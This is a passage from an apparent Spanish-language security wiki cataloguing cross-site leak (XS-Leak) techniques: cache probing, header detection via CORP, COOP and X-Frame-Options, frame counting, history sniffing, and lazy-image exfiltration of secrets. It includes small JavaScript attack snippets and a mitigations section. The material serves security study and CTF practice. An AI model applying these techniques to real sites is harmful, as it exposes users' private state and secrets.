* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Un XS-Leak puede usar el CSP para detectar si un sitio de origen cruzado fue redirigido a un origen diferente. Esta fuga puede detectar la redirecci√≥n, pero adem√°s, se revela el dominio del objetivo de la redirecci√≥n. La idea b√°sica de este ataque es **permitir el dominio objetivo en el sitio del atacante**. Una vez que se emite una solicitud al dominio objetivo, este **redirige** a un dominio de origen cruzado. **CSP bloquea** el acceso a √©l y crea un **informe de violaci√≥n utilizado como t√©cnica de fuga**. Dependiendo del navegador, **este informe puede revelar la ubicaci√≥n objetivo de la redirecci√≥n**.\
Los navegadores modernos no indicar√°n la URL a la que se redirigi√≥, pero a√∫n se puede detectar que se activ√≥ una redirecci√≥n de origen cruzado.

### Cach√©

* **M√©todos de Inclusi√≥n**: Frames, Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Resumen:** Limpiar el archivo de la cach√©. Abre la p√°gina objetivo y verifica si el archivo est√° presente en la cach√©.
* **Ejemplo de C√≥digo**:

Los navegadores pueden usar una cach√© compartida para todos los sitios web. Independientemente de su origen, es posible deducir si una p√°gina objetivo ha **solicitado un archivo espec√≠fico**.

Si una p√°gina carga una imagen solo si el usuario ha iniciado sesi√≥n, puedes **invalidar** el **recurso** (para que ya no est√© en cach√© si lo estaba, ver m√°s informaci√≥n en los enlaces), **realizar una solicitud** que podr√≠a cargar ese recurso e intentar cargar el recurso **con una mala solicitud** (por ejemplo, usando un encabezado referer demasiado largo). Si la carga del recurso **no activ√≥ ning√∫n error**, es porque estaba **en cach√©**.

### Directiva CSP

* **M√©todos de Inclusi√≥n**: Frames
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Resumen:** Las directivas de encabezado CSP pueden ser sondeadas con el atributo CSP del iframe.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Una nueva caracter√≠stica en GC permite que las p√°ginas web propongan un CSP estableciendo un atributo en un elemento iframe. Las directivas de pol√≠ticas se transmiten junto con la solicitud HTTP. Normalmente, el contenido incrustado debe permitir esto expl√≠citamente con un encabezado HTTP, **de lo contrario se muestra una p√°gina de error**. Sin embargo, si el iframe ya incluye un CSP y la nueva pol√≠tica no es m√°s estricta, la p√°gina se mostrar√° normalmente.

Esto permite a un atacante detectar directivas CSP espec√≠ficas de una p√°gina de origen cruzado, si es posible **detectar la p√°gina de error**. Aunque, este error ahora est√° marcado como corregido, encontramos una **nueva t√©cnica de fuga que puede detectar la p√°gina de error, porque el problema subyacente nunca se solucion√≥.**

### **CORP**

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Resumen:** Recurso protegido con CORP lanza un error al ser obtenido.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

El encabezado CORP es una caracter√≠stica de seguridad de la plataforma web relativamente nueva que, cuando se establece, **bloquea solicitudes de origen cruzado sin CORS al recurso dado**. La presencia del encabezado puede ser detectada, porque un recurso protegido con CORP **lanzar√° un error al ser obtenido**.

### CORB

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Resumen**: CORB puede permitir a los atacantes detectar cuando el encabezado **`nosniff`** est√° presente en la solicitud.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Consulta el enlace de m√°s informaci√≥n para m√°s detalles sobre el ataque.

### Error de CORS en la mala configuraci√≥n de Reflexi√≥n de Origen <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Resumen**: Si el encabezado Origin se refleja en el encabezado `Access-Control-Allow-Origin` es posible verificar si un recurso ya est√° en la cach√©.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

En caso de que el **encabezado Origin** est√© siendo **reflejado** en el encabezado `Access-Control-Allow-Origin` un atacante puede abusar de este comportamiento para intentar **obtener** el **recurso** en modo **CORS**. Si un **error** **no** se activa, significa que fue **correctamente recuperado de la web**, si se activa un error, es porque fue **accedido desde la cach√©** (el error aparece porque la cach√© guarda una respuesta con un encabezado CORS permitiendo el dominio original y no el dominio del atacante)**.**\
Nota que si el origen no se refleja pero se usa un comod√≠n (`Access-Control-Allow-Origin: *`) esto no funcionar√°.

## T√©cnica de Atributos Legibles

### Redirecci√≥n Fetch

* **M√©todos de Inclusi√≥n**: Fetch API
* **Diferencia Detectable**: C√≥digo de Estado
* **M√°s informaci√≥n**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Resumen:** GC y SA permiten verificar el tipo de respuesta (opaque-redirect) despu√©s de que la redirecci√≥n se ha completado.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Al enviar una solicitud usando la Fetch API con `redirect: "manual"` y otros par√°metros, es posible leer el atributo `response.type` y si es igual a `opaqueredirect` entonces la respuesta fue una redirecci√≥n.

### COOP

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Encabezado
* **M√°s informaci√≥n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Resumen:** Las p√°ginas protegidas con COOP no pueden ser accedidas.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Un atacante puede revelar si el encabezado de Pol√≠tica de Apertura de Origen Cruzado (COOP) est√° disponible dentro de una respuesta HTTP de origen cruzado.

Las aplicaciones web pueden implementar el encabezado de respuesta COOP para prevenir que otros sitios web obtengan referencias arbitrarias de ventana a la aplicaci√≥n. Sin embargo, este **encabezado puede ser detectado f√°cilmente** intentando leer la referencia **`contentWindow`**. Si un sitio solo implementa **COOP en un estado**, esta propiedad (`opener`) es **indefinida**, **de lo contrario** est√° **definida**.

### Longitud M√°xima de URL - Lado del Servidor

* **M√©todos de Inclusi√≥n**: Fetch API, Elementos HTML
* **Diferencia Detectable**: C√≥digo de Estado / Contenido
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Resumen:** Detectar diferencias en respuestas debido a que la longitud de la respuesta de redirecci√≥n puede ser demasiado grande y el servidor responde con un error y se genera una alerta.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Si una redirecci√≥n del lado del servidor usa **datos de entrada del usuario dentro de la redirecci√≥n** y **datos adicionales**. Es posible detectar este comportamiento porque usualmente los **servidores** tienen un **l√≠mite de longitud de solicitud**. Si los **datos del usuario** son esa **longitud - 1**, porque la **redirecci√≥n** est√° usando **esos datos** y **agregando** algo **extra**, activar√° un **error detectable a trav√©s de Eventos de Error**.

Si de alguna manera puedes establecer cookies a un usuario, tambi√©n puedes realizar este ataque **estableciendo suficientes cookies** ([**bomba de cookies**](hacking-with-cookies/cookie-bomb.md)) para que con el **tama√±o de respuesta aumentado** de la **respuesta correcta** se active un **error**. En este caso, recuerda que si activas esta solicitud desde el mismo sitio, `<script>` enviar√° autom√°ticamente las cookies (as√≠ que puedes verificar errores).\
Un ejemplo de la **bomba de cookies + XS-Search** se puede encontrar en la soluci√≥n prevista de este informe: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` o estar en el mismo contexto suele ser necesario para este tipo de ataque.

### Longitud M√°xima de URL - Lado del Cliente

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: C√≥digo de Estado / Contenido
* **M√°s informaci√≥n**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumen:** Detectar diferencias en respuestas porque la longitud de la respuesta de redirecci√≥n puede ser demasiado grande para una solicitud que se puede notar una diferencia.
* **Ejemplo de C√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Seg√∫n [documentaci√≥n de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), el l√≠mite m√°ximo de URL de Chrome es de 2MB.

> En general, la _plataforma web_ no tiene l√≠mites en la longitud de las URL (aunque 2^31 es un l√≠mite com√∫n). _Chrome_ limita las URL a una longitud m√°xima de **2MB** por razones pr√°cticas y para evitar causar problemas de denegaci√≥n de servicio en la comunicaci√≥n entre procesos.

Por lo tanto,
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Conteo de Marcos

* **M√©todos de Inclusi√≥n**: Marcos, Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumen:** Leer n√∫mero de marcos (window.length).
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar el **n√∫mero de marcos en una web** abierta a trav√©s de `iframe` o `window.open` podr√≠a ayudar a identificar el **estado del usuario en esa p√°gina**.\
Adem√°s, si la p√°gina siempre tiene el mismo n√∫mero de marcos, verificar **continuamente** el n√∫mero de marcos podr√≠a ayudar a identificar un **patr√≥n** que podr√≠a filtrar informaci√≥n.

Un ejemplo de esta t√©cnica es que en Chrome, un **PDF** puede ser **detectado** con **conteo de marcos** porque internamente se utiliza un `embed`. Hay [Par√°metros de URL Abiertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permiten cierto control sobre el contenido como `zoom`, `view`, `page`, `toolbar` donde esta t√©cnica podr√≠a ser interesante.

### HTMLElements

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumen:** Leer el valor filtrado para distinguir entre 2 estados posibles
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Algunas p√°ginas web pueden **generar din√°micamente archivos multimedia** dependiendo de la informaci√≥n del usuario o agregar marcas de agua que cambian el tama√±o de los medios. Un atacante puede usar la informaci√≥n filtrada por esos elementos HTML para distinguir entre estados posibles.

Algunos HTMLElements filtrar√°n informaci√≥n a or√≠genes cruzados como el tipo de medios que son:

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) filtra la `duraci√≥n` de los medios y los tiempos `buffered`.
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) filtra la `videoHeight` y `videoWidth` algunos navegadores tambi√©n pueden tener `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` y `webkitDecodedFrameCount`
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) filtra los `totalVideoFrames`.
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) filtra la `altura` y `anchura` pero si la imagen es inv√°lida ser√°n 0 y [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) ser√° rechazado.

### Propiedad CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumen:** Detectar el estilo del sitio web dependiendo del estado del usuario.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Las aplicaciones web pueden cambiar el **estilo del sitio web dependiendo del estado del usuario**. Los archivos CSS de origen cruzado se pueden incrustar en la p√°gina del atacante con el **elemento de enlace HTML**, y las **reglas** se **aplicar√°n** a la p√°gina del atacante. Si una p√°gina cambia din√°micamente estas reglas, un atacante puede **detectar** estas **diferencias** dependiendo del estado del usuario.\
Como t√©cnica de filtraci√≥n, el atacante puede usar el m√©todo `window.getComputedStyle` para **leer propiedades CSS** de un elemento HTML espec√≠fico. Como resultado, un atacante puede leer propiedades CSS arbitrarias si se conoce el elemento afectado y el nombre de la propiedad.

### Historial CSS

* **M√©todos de Inclusi√≥n**: Elementos HTML
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumen:** Detectar si el estilo `:visited` se aplica a una URL indicando que ya fue visitada
* **Ejemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Seg√∫n [**esto**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), esto no funciona en Chrome sin cabeza.
{% endhint %}

Usando el selector CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited), es posible aplicar un estilo diferente para las URL que han sido visitadas.\
Anteriormente era posible usar [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) para detectar esta diferencia, pero ahora los navegadores lo previenen devolviendo siempre valores como si el enlace fuera visitado y limitando qu√© estilos se pueden aplicar usando el selector.\
Por lo tanto, puede ser necesario enga√±ar al usuario para que haga clic en un √°rea que el CSS ha afectado, esto se puede hacer usando [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode).\
Tambi√©n hay formas de hacerlo sin interacci√≥n del usuario, como abusar de los tiempos de renderizado, esto funciona porque toma tiempo pintar los enlaces de un color diferente.\
Se proporcion√≥ un PoC en un informe de cromo que funciona utilizando m√∫ltiples enlaces para aumentar la diferencia de tiempo.

### Fuga de X-Frame en ContentDocument

* **M√©todos de Inclusi√≥n**: Marcos
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumen:** En GC, cuando una p√°gina no tiene permiso para incrustarse en una p√°gina de origen cruzado debido a **X-Frame-Options, se muestra una p√°gina de error**.
* **Ejemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

En Chrome, cuando una p√°gina no tiene permiso para incrustarse en una p√°gina de origen cruzado, porque el encabezado **X-FrameOptions** (XFO) est√° configurado para denegar o mismo origen, se muestra una **p√°gina de error en su lugar**. Para objetos, esta p√°gina de error puede ser **detectada comprobando la propiedad `contentDocument`**. T√≠picamente, esta propiedad devuelve null porque no se permite el acceso a un documento incrustado de origen cruzado. Sin embargo, debido al **renderizado de Chrome** de la p√°gina de error, se devuelve un **objeto de documento vac√≠o** en su lugar. Esto no funciona para iframes ni en otros navegadores. Los desarrolladores pueden olvidar configurar X-Frame-Options para todas las p√°ginas y especialmente las p√°ginas de error a menudo carecen de este encabezado. Como t√©cnica de filtraci√≥n, un atacante puede ser capaz de diferenciar entre diferentes estados de usuario comprob√°ndolo.

### Detecci√≥n de Descargas

* **M√©todos de Inclusi√≥n**: Marcos, Pop-ups
* **Diferencia Detectable**: Encabezados
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumen:** El atacante puede detectar descargas usando iframes. Si el iframe sigue siendo accesible, el archivo fue descargado.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

El encabezado `Content-Disposition` ([`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)) indica si el navegador debe descargar el contenido o mostrarlo en l√≠nea.

Si solo un usuario registrado podr√≠a **acceder a una p√°gina que descargar√° un archivo** porque est√° usando el encabezado. Es posible detectar ese comportamiento.

#### Barra de Descarga <a href="#download-bar" id="download-bar"></a>

En los navegadores basados en Chromium, cuando se descarga un archivo, se muestra una vista previa del proceso de descarga **en una barra en la parte inferior**, integrada en la ventana del navegador. Al **monitorear la altura de la ventana**, los atacantes pueden detectar si se abri√≥ la "barra de descarga".

#### Navegaci√≥n de Descarga (con iframes) <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

Otra forma de probar el encabezado [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) es **verificar si ocurri√≥ una navegaci√≥n**. Si una carga de p√°gina causa una descarga, no se desencadena una navegaci√≥n y la **ventana permanece dentro del mismo origen**.

#### Navegaci√≥n de Descarga (sin iframes) <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

Misma t√©cnica que la anterior pero usando `window.open` en lugar de iframes.

### Bypass de Cach√© HTTP Particionada <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Tiempo
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumen:** El atacante puede detectar descargas usando iframes. Si el iframe sigue siendo accesible, el archivo fue descargado.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Esto es por qu√© esta t√©cnica es interesante: Chrome ahora tiene **particionamiento de cach√©**, y la clave de cach√© de la p√°gina reci√©n abierta es: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, pero si abro una p√°gina de ngrok y uso fetch en ella, la clave de cach√© ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **clave de cach√© es diferente**, por lo que la cach√© no se puede compartir. Puedes encontrar m√°s detalles aqu√≠: [Ganando seguridad y privacidad al particionar la cach√©](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comentario de [**aqu√≠**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un sitio `example.com` incluye un recurso de `*.example.com/resource` entonces ese recurso tendr√° la **misma clave de cach√©** como si el recurso fuera **solicitado directamente a trav√©s de navegaci√≥n de nivel superior**. Eso es porque la clave de cach√© consiste en el _eTLD+1_ de nivel superior y el _eTLD+1_ del marco.

Debido a que acceder a la cach√© es m√°s r√°pido que cargar un recurso, es posible intentar cambiar la ubicaci√≥n de una p√°gina y cancelarla 20ms (por ejemplo) despu√©s. Si el origen cambi√≥ despu√©s de la parada, significa que el recurso estaba en cach√©.\
O simplemente podr√≠a **enviar algunos fetch a la p√°gina potencialmente en cach√© y medir el tiempo que toma**.

### Redirecci√≥n Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Redirecciones
* **M√°s informaci√≥n**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
* **Resumen:** Es posible averiguar si una respuesta a una solicitud de fetch es una redirecci√≥n
* **Ejemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch con AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclusi√≥n**: API Fetch
* **Diferencia Detectable**: Tiempo
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumen:** Es posible intentar cargar un recurso y abortar antes de que se cargue, si se interrumpe la carga. Dependiendo de si se desencadena un error, el recurso estaba o no estaba en cach√©.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) podr√≠a combinarse con _**fetch**_ y _**setTimeout**_ para detectar tanto si el **recurso est√° en cach√©** como para expulsar un recurso espec√≠fico de la cach√© del navegador. Una caracter√≠stica interesante de esta t√©cnica es que la sonda se realiza sin cachear nuevo contenido en el proceso.

### Contaminaci√≥n de Scripts

* **M√©todos de Inclusi√≥n**: Elementos HTML (script)
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumen:** Cuando un **script de origen cruzado** se incluye en una p√°gina, **no es posible leer directamente** su contenido. Sin embargo, si un script **utiliza funciones integradas**, es posible **sobrescribirlas** y leer sus argumentos que podr√≠an **filtrar informaci√≥n valiosa**.
* **Ejemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©todos de Inclusi√≥n**: Pop-ups
* **Diferencia Detectable**: Contenido de la P√°gina
* **M√°s informaci√≥n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumen:** Medir tiempo de ejecuci√≥n de una web usando service workers.
* **Ejemplo de C√≥digo**:

1. El atacante registra un service worker en uno de sus dominios (attacker.com).
2.
```html
<img src=/something loading=lazy >
```
Por lo tanto, lo que puedes hacer es **a√±adir muchos caracteres basura** (Por ejemplo, **miles de "W"s**) para **llenar la p√°gina web antes del secreto o a√±adir algo como** `<br><canvas height="1850px"></canvas><br>`.\
Entonces, si por ejemplo nuestra **inyecci√≥n aparece antes de la bandera**, la **imagen** se **cargar√≠a**, pero si aparece **despu√©s** de la **bandera**, la bandera + la basura **impedir√°n que se cargue** (necesitar√°s jugar con la cantidad de basura a colocar). Esto es lo que ocurri√≥ en [**este writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Otra opci√≥n ser√≠a usar el **scroll-to-text-fragment** si est√° permitido:

#### Scroll-to-text-fragment

Sin embargo, haces que el **bot acceda a la p√°gina** con algo como
```
#:~:text=SECR
```
Por lo tanto, la p√°gina web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Donde post.html contiene los caracteres basura del atacante y la imagen de carga perezosa y luego se agrega el secreto del bot.

Lo que har√° este texto es hacer que el bot acceda a cualquier texto en la p√°gina que contenga el texto `SECR`. Como ese texto es el secreto y est√° justo **debajo de la imagen**, la **imagen solo se cargar√° si el secreto adivinado es correcto**. As√≠ que ah√≠ tienes tu or√°culo para **exfiltrar el secreto car√°cter por car√°cter**.

Algunos ejemplos de c√≥digo para explotar esto: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carga Perezosa de Im√°genes Basada en Tiempo

Si **no es posible cargar una imagen externa** que podr√≠a indicar al atacante que la imagen se carg√≥, otra opci√≥n ser√≠a intentar **adivinar el car√°cter varias veces y medir eso**. Si la imagen se carga, todas las solicitudes tardar√°n m√°s que si la imagen no se carga. Esto es lo que se utiliz√≥ en la [**soluci√≥n de este writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqu√≠:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si se usa `jQuery(location.hash)`, es posible averiguar mediante el tiempo **si existe alg√∫n contenido HTML**, esto se debe a que si el selector `main[id='site-main']` no coincide, no necesita verificar el resto de los **selectores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inyecci√≥n de CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defensas

En esta secci√≥n puedes encontrar parte de las mitigaciones recomendadas en [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), sin embargo, hay m√°s mitigaciones en cada secci√≥n de la wiki [https://xsleaks.dev/](https://xsleaks.dev/). Visita ese sitio para m√°s informaci√≥n sobre c√≥mo protegerse contra estas t√©cnicas.

### Mitigaciones del M√©todo de Inclusi√≥n

* **Elementos HTML**. Puede usar el **encabezado CORP para controlar si las p√°ginas pueden incrustar un recurso**. CORP puede establecerse en same-origin o same-site y bloquea cualquier solicitud cross-origin o cross-site a ese recurso. En el **lado del cliente**, los navegadores basados en Chromium utilizan el algoritmo **CORB** para decidir si se deben permitir o denegar las solicitudes de recursos cross-origin.
* **Frames**. La principal defensa para **prevenir la carga de elementos iframe** de recursos HTML es el uso de **X-Frame-Options**. Alternativamente, la **directiva CSP frame-ancestors** puede lograr un resultado similar. Si se deniega la incrustaci√≥n, el m√©todo de inclusi√≥n no puede detectar una diferencia en las respuestas.
* **Pop-ups**. Para restringir el acceso a `window.opener`, el **encabezado de respuesta HTTP COOP** define tres valores diferentes: unsafe-none (predeterminado), same-origin-allow-popups y same-origin. Estos valores se pueden usar para **aislar pesta√±as de navegaci√≥n y pop-ups** y as√≠, mitiga las t√©cnicas de leak basadas en pop-ups.
